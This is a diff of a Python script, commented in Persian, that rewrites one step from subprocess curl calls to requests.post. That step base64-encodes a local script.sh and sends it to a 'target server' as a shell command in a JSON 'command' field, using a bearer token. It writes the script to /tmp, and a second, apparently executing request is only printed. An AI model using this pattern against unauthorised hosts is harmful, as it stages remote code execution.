@@ -6,7 +6,6 @@ import re
 import sys
 import base64
 import requests
-import subprocess  # <-- اضافه شد برای اجرای دستورات
 
 
 # ============================================================
@@ -807,12 +806,13 @@ else:
 
 
 # ============================================================
-# 2H. EXECUTE FIRST CURL & PRINT RESULT (CLEAN)
+# 2H. EXECUTE FIRST CURL (via requests) & PRINT RESULT
 # ============================================================
 #
-# - فقط اولین curl اجرا می‌شود (ارسال script.sh به سرور هدف)
-# - نتیجه‌ی اجرا به‌صورت تمیز در لاگ چاپ می‌شود
-# - دومین curl (اجرای اسکریپت) اجرا نمی‌شود
+# - محتوای script.sh را به base64 تبدیل می‌کند
+# - با requests.post درخواست اول را می‌فرستد
+# - نتیجه را تمیز چاپ می‌کند
+# - دومین درخواست را فقط به‌عنوان متن مرجع چاپ می‌کند (اجرا نمی‌شود)
 #
 # ============================================================
 
@@ -822,56 +822,54 @@ if endpoint and token_value:
     print(" EXECUTING FIRST CURL (SEND SCRIPT)")
     print("======================================")
 
-    # 1. تبدیل script.sh به base64
+    # 1. خواندن script.sh و تبدیل به base64
     try:
-        b64_result = subprocess.run(
-            ["base64", "-w0", "script.sh"],
-            capture_output=True,
-            text=True,
-            check=True
-        )
-        b64_data = b64_result.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        print(f"ERROR: base64 encoding failed: {e.stderr}")
+        with open("script.sh", "rb") as f:
+            script_bytes = f.read()
+        b64_data = base64.b64encode(script_bytes).decode('ascii')
+    except Exception as e:
+        print(f"ERROR: Could not read/encode script.sh: {e}")
         sys.exit(1)
 
-    # 2. ساخت دستور curl اول
-    curl_cmd = [
-        "curl", "-X", "POST", endpoint,
-        "-H", f"Authorization: Bearer {token_value}",
-        "-H", "Content-Type: application/json",
-        "-d", f'{{"command": "echo \'{b64_data}\' > /tmp/script.b64"}}'
-    ]
+    # 2. ساخت payload برای اولین درخواست
+    payload = {
+        "command": f"echo '{b64_data}' > /tmp/script.b64"
+    }
 
-    # 3. اجرای curl
+    # 3. ارسال درخواست با requests
     try:
-        result = subprocess.run(
-            curl_cmd,
-            capture_output=True,
-            text=True,
+        response = requests.post(
+            endpoint,
+            headers={
+                "Authorization": f"Bearer {token_value}",
+                "Content-Type": "application/json"
+            },
+            json=payload,
             timeout=60
         )
-    except subprocess.TimeoutExpired:
-        print("ERROR: curl command timed out after 60 seconds")
+    except requests.RequestException as e:
+        print(f"ERROR: Request failed: {e}")
         sys.exit(1)
 
     # 4. چاپ نتیجه‌ی تمیز
     print()
     print("=== CURL EXECUTION RESULT ===")
-    print(f"Status code: {result.returncode}")
-    if result.stdout:
-        print("STDOUT:")
-        print(result.stdout.strip())
-    if result.stderr:
-        print("STDERR:")
-        print(result.stderr.strip())
+    print(f"Status code: {response.status_code}")
+    if response.text:
+        print("Response body:")
+        print(response.text.strip())
+    else:
+        print("Response body: (empty)")
     print("==============================")
 
-    # 5. چاپ خود دستور (برای اطلاع)
+    # 5. چاپ خود درخواست (برای اطلاع)
     print()
-    print("=== COMMAND EXECUTED ===")
-    print(" ".join(curl_cmd))
-    print("=========================")
+    print("=== REQUEST SENT ===")
+    print(f"POST {endpoint}")
+    print(f"Authorization: Bearer {token_value}")
+    print(f"Content-Type: application/json")
+    print(f"Payload: {payload}")
+    print("=====================")
 
     # 6. (اختیاری) چاپ دستور دوم به‌عنوان متن، بدون اجرا
     print()
